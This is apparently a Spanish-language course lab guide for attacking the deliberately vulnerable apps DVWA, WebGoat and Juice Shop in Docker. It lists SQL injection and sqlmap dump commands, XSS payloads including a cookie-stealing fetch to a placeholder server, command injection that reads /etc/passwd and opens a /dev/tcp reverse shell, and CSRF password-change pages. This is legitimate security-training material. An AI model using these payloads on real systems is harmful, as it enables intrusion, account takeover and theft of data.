# 🦸 Unit 3: Explotación Web y APIs - LAB PRÁCTICO

## 📋 Requisitos Previos

### Software Requerido
- **Docker** y **Docker Compose**
- **Cliente SSH**
- **Navegador web** (recomendado Firefox o Chrome)
- **Burp Suite** (opcional, para proxy)
- **curl** y **Postman** (opcional)

### Conocimientos Recomendados
- Protocolo HTTP (GET, POST, Headers, Cookies, Sessions)
- Conceptos básicos de HTML y JavaScript
- Qué es SQL y cómo funcionan las bases de datos
- Conceptos de Same-Origin Policy

---

## 🎯 Objetivos de Aprendizaje

1. ✅ **Identificar y explotar** inyecciones SQL
2. ✅ **Ejecutar ataques** Cross-Site Scripting (XSS)
3. ✅ **Manipular** formularios y cookies
4. ✅ **Bypassar** controles de acceso
5. ✅ **Probar** APIs REST/GraphQL
6. ✅ **Usar herramientas** especializadas (SQLMap, Burp Suite)

---

## 🏗️ Arquitectura del Laboratorio

```
┌──────────────────────────────────────────────────────────────────┐
│                      LABORATORIO 3                                │
│                  EXPLOTACIÓN WEB Y APIs                            │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│   ┌─────────────┐                            ┌─────────────┐     │
│   │    KALI    │        ATAQUE              │   OBJETOS   │     │
│   │   LINUX    │  ──────────────────────→   │   VULNES   │     │
│   │ (Atacante) │                            │             │     │
│   │192.168.58.2│                           │192.168.58.3│     │
│   └─────────────┘                            └─────────────┘     │
│        │                                            │            │
│        │  • Burp Suite                             │            │
│        │  • SQLMap                                │            │
│        │  • Nikto                                │            │
│        │  • curl                                │            │
│        │                                          │            │
│        │        ┌─────────────┐  ┌────────────┐   │            │
│        │        │   WebGoat  │  │    DVWA    │   │            │
│        │        │   :8081    │  │   :8082    │   │            │
│        │        └─────────────┘  └────────────┘   │            │
│        │        ┌─────────────┐                    │            │
│        │        │Juice Shop  │                    │            │
│        │        │   :8083    │                    │            │
│        │        └─────────────┘                    │            │
│        │            RED: 192.168.58.0/24          │            │
└────────┼──────────────────────────────────────────┼────────────┘
         │
     SSH:2222
```

---

## 🚀 INSTRUCCIONES DETALLADAS

### Paso 1: Iniciar el Laboratorio

```bash
cd docker-labs/unit3
docker-compose up -d
```

### Paso 2: Verificar Servicios

```bash
docker ps

# Obtener IPs
docker network inspect docker-labs_unit3_lab-network | grep IPv4Address
```

### Paso 3: Acceder a los Objetivos

| Objetivo | URL | Credenciales |
|----------|-----|--------------|
| **WebGoat** | http://localhost:8081/WebGoat | Nuevo usuario |
| **DVWA** | http://localhost:8082 | admin / password |
| **Juice Shop** | http://localhost:8083 | admin@juice.sh / admin123 |

### Paso 4: Conectar a Kali

```bash
ssh root@localhost -p 2222
# Password: toor
```

---

## 🎯 Objetivos para Atacar

| Objetivo | URL | Puerto | Vulnerabilidades |
|----------|-----|--------|-----------------|
| **WebGoat** | http://localhost:8081 | 8081 | OWASP Top 10 completo |
| **DVWA** | http://localhost:8082 | 8082 | SQLi, XSS, CSRF, Command Injection |
| **Juice Shop** | http://localhost:8083 | 3000 | Multiples OWASP |

---

## ⚔️ EJERCICIOS DE ATAQUE - GUÍA DETALLADA

### Ejercicio 1: Configuración Inicial - DVWA

**Duración**: 15 minutos

**Objetivo**: Configurar DVWA y entender los niveles de seguridad

**Paso 1: Acceder a DVWA**

1. Abre navegador en: http://localhost:8082
2. Click en "Setup / Reset DB"
3. Click en "Create / Reset Database"
4. Inicia sesión con: admin / password

**Paso 2: Ajustar Nivel de Seguridad**

1. Ve a "DVWA Security"
2. Cambia el nivel a "Low" (para principiantes)
3. Later puedes probar "Medium" y "High"

---

### Ejercicio 2: SQL Injection

**Duración**: 30 minutos

**Teoría**: SQL Injection ocurre cuando un atacante inserta código SQL malicioso en campos de entrada que no están correctamente validados.

#### 2.1 SQLi Básico - Bypass de Login

**URL**: http://localhost:8082/vulnerabilities/sqli/

En el campo de ID de usuario, introduce:

```sql
admin'--
```

O:

```sql
' OR '1'='1
```

**Expected**: Deberías ver los datos del usuario admin sin conocer el password.

#### 2.2 SQLi con UNION

```sql
1' UNION SELECT 1,2,3--
```

```sql
1' UNION SELECT user,password,3 FROM users--
```

#### 2.3 SQLMap Automatizado

```bash
# Instalar sqlmap si no está
apt-get update && apt-get install -y sqlmap

# Enumerar bases de datos
sqlmap -u "http://192.168.58.3/vulnerabilities/sqli/?id=1&Submit=Submit" --dbs --batch

# Enumerar tablas
sqlmap -u "http://192.168.58.3/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa --tables

# Extraer datos
sqlmap -u "http://192.168.58.3/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa -T users --dump
```

**Explicación de flags**:
- `--dbs`: Listar bases de datos
- `-D [db]`: Seleccionar base de datos
- `--tables`: Listar tablas
- `-T [table]`: Seleccionar tabla
- `--dump`: Extraer datos

---

### Ejercicio 3: Cross-Site Scripting (XSS)

**Duración**: 25 minutos

**Teoría**: XSS permite ejecutar JavaScript arbitrario en el navegador de otras víctimas.

#### 3.1 XSS Reflected

**URL**: http://localhost:8082/vulnerabilities/xss_r/

**Payload básico**:
```html
<script>alert(document.cookie)</script>
```

**Payload evade filtros**:
```html
<img src=x onerror=alert(document.cookie)>
```

```html
<svg onload=alert(document.cookie)>
```

```javascript
"><script>alert(1)</script>
```

#### 3.2 XSS Stored (Persistente)

**URL**: http://localhost:8082/vulnerabilities/xss_s/

En el formulario de guestbook, introduce:

```html
<script>alert('XSS')</script>
```

O para robar cookies:

```html
<script>
fetch('http://tu-servidor.com/steal?cookie='+document.cookie);
</script>
```

#### 3.3 XSS en DOM

**URL**: http://localhost:8082/vulnerabilities/xss_d/

Prueba:

```html
<img src=x onerror=alert(document.domain)>
```

---

### Ejercicio 4: Command Injection

**Duración**: 15 minutos

**Teoría**: Ocurre cuando una aplicación pasa entrada del usuario a funciones del sistema sin sanitización.

**URL**: http://localhost:8082/vulnerabilities/cmdi/

#### 4.1 Comandos Básicos

**Linux**:
```bash
# Listar archivos
127.0.0.1; ls -la

# Leer archivo de contraseña
127.0.0.1; cat /etc/passwd

# Reverse shell
127.0.0.1; bash -i >& /dev/tcp/TU-IP/4444 0>&1
```

**Windows**:
```bash
# Listar archivos
127.0.0.1 & dir

# Leer archivo
type C:\Windows\win.ini
```

#### 4.2 Bypass de Filtros

Si el filtro bloquea `;`, intenta:

```bash
127.0.0.1 | ls -la
```

```bash
127.0.0.1 `ls -la`
```

```bash
127.0.0.1 && ls -la
```

---

### Ejercicio 5: CSRF (Cross-Site Request Forgery)

**Duración**: 15 minutos

**Teoría**: Engaña a la víctima para que ejecute acciones no deseadas.

**URL**: http://localhost:8082/vulnerabilities/csrf/

#### 5.1 Crear Página de Ataque

Crea un archivo HTML malicioso:

```html
<img src="http://localhost:8082/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">
```

#### 5.2 Formulario CSRF

```html
<form action="http://localhost:8082/vulnerabilities/csrf/" method="GET">
  <input type="hidden" name="password_new" value="hacked">
  <input type="hidden" name="password_conf" value="hacked">
  <input type="hidden" name="Change" value="Change">
</form>
<script>document.forms[0].submit()</script>
```

---

### Ejercicio 6: WebGoat - Lecciones OWASP

**Duración**: 45 minutos

**Objetivo**: Completar lecciones estructuradas de OWASP Top 10

#### Acceder a WebGoat

1. Abre: http://localhost:8081/WebGoat
2. Crea una cuenta nueva
3. Explora las lecciones en el menú izquierdo

#### Lecciones Recomendadas

1. **A1 - Injection**
   - SQL Injection (intro)
   - String SQL Injection
   - Numeric SQL Injection

2. **A2 - Broken Authentication**
   - Password reset
   - Session management

3. **A3 - Sensitive Data Exposure**
   - Insecure login

4. **A7 - XSS**
   - Reflected XSS
   - Stored XSS
   - DOM-based XSS

---

### Ejercicio 7: Juice Shop - CTF Mode

**Duración**: 30 minutos

**Objetivo**: Completar desafíos de seguridad web

#### Acceder a Juice Shop

1. Abre: http://localhost:8083
2. Crea una cuenta o usa: admin@juice.sh / admin123

#### Desafíos Iniciales

1. **Tutorial**: Completa el tutorial interactivo
2. **Score Board**: Ve los desafíos disponibles
3. **Empieza con**:
   - Login Admin
   - Extraer datos
   - XSS Challenges

---

## 📋 Checklist de Entrega

| # | Tarea | Completado |
|---|-------|-----------|
| 1 | Configurar DVWA en nivel Low | ☐ |
| 2 | SQL Injection - Bypass login | ☐ |
| 3 | SQL Injection - Extraer usuarios | ☐ |
| 4 | SQLMap - Enumerar base de datos | ☐ |
| 5 | XSS Reflected | ☐ |
| 6 | XSS Stored | ☐ |
| 7 | XSS - Robar cookies | ☐ |
| 8 | Command Injection | ☐ |
| 9 | CSRF - Cambiar password | ☐ |
| 10 | WebGoat - 3 lecciones | ☐ |
| 11 | Juice Shop - 2 desafíos | ☐ |

---

## 🔧 Troubleshooting

### Problema: DVWA no carga
```bash
# Verificar contenedor
docker logs target-dvwa

# Reiniciar
docker-compose restart dvwa
```

### Problema: No puedo hacer login
```bash
# El usuario por defecto es:
# Username: admin
# Password: password
```

### Problema: WebGoat muy lento
```bash
# WebGoat puede tardar en iniciar
# Espera 2-3 minutos
# Verifica con: docker logs target-webgoat
```

---

## 🛑 LIMPIEZA

```bash
cd docker-labs/unit3
docker-compose down -v
```

---

## ✅ Próximo Laboratorio

- **Unit 4**: Active Directory Attack
- Aprenderás ataques específicos contra entornos Windows/AD

---

## 📚 Recursos Adicionales

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [SQLMap Documentation](https://sqlmap.org/)
- [DVWA Documentation](https://dvwa.co.uk/)
- [WebGoat GitHub](https://github.com/WebGoat/WebGoat)
- [Juice Shop](https://owasp.org/www-project-juice-shop/)